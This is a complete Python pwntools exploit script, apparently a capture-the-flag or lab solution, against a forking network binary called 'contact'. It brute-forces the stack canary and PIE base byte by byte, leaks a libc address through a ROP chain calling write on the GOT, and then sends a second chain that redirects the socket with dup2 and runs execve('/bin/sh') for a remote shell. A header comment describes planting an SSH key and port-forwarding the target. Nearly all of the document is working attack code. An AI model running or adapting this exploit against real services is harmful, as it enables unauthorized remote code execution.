from pwn import *

TARGET = 'localhost'
PORT = 1337

context.log_level = 'CRITICAL'
context.binary = binary = ELF('./contact')
libc = ELF('./libc.so.6')

PADDING = 0x38
PIE_OFFSET = 0x14ee

'''
Steps to exploit:

1. Drop an SSH key for any user on the box

2. Use SSH to port forward the target machine localhost:1337 to
	your attacking machines localhost:1337 using
	"ssh -L 1337:localhost:1337 -i <SSH_KEY_FILE> <USERNAME>@<TARGET_IP>"

3. Run python3 exploit.py
'''



def brute_canary():
	canary = b'\x00'
	print('found byte 1: 0x00')

	for i in range(7):
		for char in range(256):
			payload = b'A' * PADDING
			payload += canary
			payload += bytes([char])

			p = remote(TARGET, PORT)
			p.recvuntil(b'Please enter the message you want to send to admin:\n')
			p.send(payload)

			try:
				p.recvuntil(b'Done.\n', timeout=2)
				canary += bytes([char])
				print(f'found byte {i+2}: {hex(u64(canary.ljust(8, b"\x00")))}')
				p.close()
				break
			except:
				p.close()
				continue


	p.close()
	return canary

def brute_pie(canary):
	pie_leak = b'\xee'
	print('found byte 1: 0xee')

	while len(pie_leak) < 6:
		for char in range(256):
			payload = b'A' * PADDING
			payload += p64(canary)
			payload += b'B' * 8
			payload += pie_leak
			payload += bytes([char])

			p = remote(TARGET, PORT)
			p.recvuntil(b'Please enter the message you want to send to admin:\n')
			p.send(payload)

			try:
				p.recvuntil(b'Please enter the message you want to send to admin:\n', timeout=2)
				pie_leak += bytes([char])
				print(f'found byte {len(pie_leak)}: {hex(u64(pie_leak.ljust(8, b"\x00")))}')
				p.close()
				break
			except:
				p.close()
				continue

	p.close()
	return pie_leak.ljust(8, b'\x00')

# Abuse fork() for leaks
canary = u64(brute_canary())
print(f'canary: {hex(canary)}')

pie_leak = u64(brute_pie(canary))
binary.address = pie_leak - PIE_OFFSET
print(f'pie leak: {hex(pie_leak)}')
print(f'pie base: {hex(binary.address)}')


# Calculate gadgets in the binary
POP_RDI = binary.address + 0x164b
POP_RDX = binary.address + 0x1265
POP_RSI_R15 = binary.address + 0x1649

RET = binary.address + 0x1016

WRITE_PLT = binary.plt.write
WRITE_GOT = binary.got.write

# Overflow buffer
leak_payload = b'A' * PADDING

# Overwrite canary & saved RBP
leak_payload += p64(canary)
leak_payload += b'B' * 8

# write(4, write@GOT, 8);
leak_payload += p64(POP_RDI)
leak_payload += p64(4)
leak_payload += p64(POP_RSI_R15)
leak_payload += p64(WRITE_GOT)
leak_payload += p64(0)
leak_payload += p64(POP_RDX)
leak_payload += p64(8)
leak_payload += p64(WRITE_PLT)
leak_payload += p64(pie_leak)

# Send ROP to leak write@LIBC
p = remote(TARGET, PORT)
p.recvuntil(b'Please enter the message you want to send to admin:\n')
p.send(leak_payload)

libc_leak = u64(p.recvrepeat(1)[:8])
libc.address = libc_leak - libc.symbols.write
print(f'libc leak: {hex(libc_leak)}')
print(f'libc base: {hex(libc.address)}')

p.close()

# Calculate LIBC gadgets
r = ROP(libc)
SYSCALL = r.find_gadget(['syscall','ret'])[0]
POP_RAX = r.find_gadget(['pop rax','ret'])[0]

BIN_SH = next(libc.search(b'/bin/sh\x00'))

# Overflow buffer
rce = b'A' * PADDING

# Overwrite canary & saved RBP
rce += p64(canary)
rce += b'B' * 8

# dup2(4, 0);
rce += p64(POP_RDI)
rce += p64(4)
rce += p64(POP_RSI_R15)
rce += p64(0) * 2
rce += p64(POP_RAX)
rce += p64(33)
rce += p64(SYSCALL)

# dup2(4, 1);
rce += p64(POP_RDI)
rce += p64(4)
rce += p64(POP_RSI_R15)
rce += p64(1)
rce += p64(0)
rce += p64(POP_RAX)
rce += p64(33)
rce += p64(SYSCALL)

# execve("/bin/sh", 0, 0);
rce += p64(POP_RDI)
rce += p64(BIN_SH)
rce += p64(POP_RSI_R15)
rce += p64(0) * 2
rce += p64(POP_RDX)
rce += p64(0)
rce += p64(POP_RAX)
rce += p64(59)
rce += p64(SYSCALL)

# Send final ROP chain
p = remote(TARGET, PORT)
p.recvuntil(b'Please enter the message you want to send to admin:\n')
p.send(rce)
p.interactive()
